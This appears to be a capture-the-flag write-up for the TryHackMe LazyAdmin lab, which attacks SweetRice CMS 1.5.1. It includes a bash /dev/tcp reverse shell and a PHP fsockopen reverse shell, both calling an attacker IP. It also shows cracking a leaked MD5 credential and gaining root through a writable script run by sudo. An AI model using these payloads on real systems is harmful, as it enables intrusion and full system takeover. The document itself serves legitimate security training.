# TryHackMe - LazyAdmin  
🔗 https://tryhackme.com/room/lazyadmin  
📝 CMS: SweetRice v1.5.1  
🎯 Goal: Gain initial access, exploit CMS upload or backup leak, escalate to root via sudo misconfiguration

---

## 🖥️ Target Information

| Property     | Value                         |
|--------------|-------------------------------|
| IP Address   | 10.10.247.215                 |
| OS           | Ubuntu (inferred)             |
| Web Server   | Apache 2.4.18 (Ubuntu)        |
| SSH Server   | OpenSSH 7.2p2 Ubuntu          |
| CMS Detected | SweetRice v1.5.1              |

---

## 🔍 1. Enumeration

### Nmap Scan
```bash
nmap -sV -O 10.10.247.215
```

Results:
- 22/tcp → OpenSSH 7.2p2
- 80/tcp → Apache httpd 2.4.18

---

### Gobuster Scan
```bash
gobuster dir -u http://10.10.247.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php
```

Discovered:
- `/content/images`
- `/content/js`
- `/content/inc`
- `/content/as`
- `/content/_themes`
- `/content/attachment`

💡 `/js` source reveals SweetRice version

---

## 🔎 2. CMS Version Discovery

- Found `/content/inc/latest.txt` → shows **SweetRice v1.5.1**
- Vulnerability found:
  - [Exploit-DB 10246](https://www.exploit-db.com/exploits/10246)
  - [VulDB 51051](https://vuldb.com/ja/?id.51051)

---

## 🚪 3. RFI Attempts (Failed)

Reverse shell payload:
```php
<?php system('bash -i >& /dev/tcp/10.10.174.42/12345 0>&1'); ?>
```

Serve it:
```bash
python3 -m http.server 8000
```

Listener:
```bash
nc -lvnp 12345
```

Tested URLs:
```
http://10.10.247.215/content/index.php?root_dir=http://10.10.174.42:8000/aaa.php
http://10.10.247.215/content/as/lib/post.php?root_dir=http://10.10.174.42:8000/aaa.php
```

❌ RFI exploitation failed.

---

## 🧠 4. Password Disclosure via Backup

Found backup at:
```
/content/inc/backup_database
```

Extracted:
```
manager:42f749ade7f9e195bf475f37a44cafcb
```

Cracked with John:
```bash
echo "manager:42f749ade7f9e195bf475f37a44cafcb" > hash.txt
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
```

✅ Credentials:
- Username: `manager`
- Password: `Password123`

---

## 💥 5. Web Shell Upload (via Attachment)

Login to CMS dashboard → Upload a `.zip` containing reverse shell PHP.

Payload:
```php
<?php
$ip = '10.10.174.42';
$port = 12345;
$sock=fsockopen($ip, $port);
$proc = proc_open("/bin/bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

Start listener:
```bash
nc -lvnp 12345
```

✅ Reverse shell obtained as `www-data`.

---

## 🔓 6. Privilege Escalation

### Sudo Enumeration
```bash
sudo -l
```

Result:
```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Script content:
```perl
system("sh", "/etc/copy.sh");
```

🚫 `/home/itguy/backup.pl` is NOT writable  
✅ `/etc/copy.sh` IS writable

---

### Overwrite /etc/copy.sh

Command:
```bash
echo "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" > /etc/copy.sh
```

Trigger root shell:
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

✅ Root shell obtained!

---

## ✅ Summary

| Phase                | Status                         |
|---------------------|---------------------------------|
| Service Enumeration  | ✅ Nmap + Gobuster              |
| CMS Version Check    | ✅ SweetRice 1.5.1              |
| Backup Extraction    | ✅ manager:Password123          |
| Shell Upload         | ✅ Reverse shell via zip        |
| Privilege Escalation | ✅ Sudo Perl → writable copy.sh |

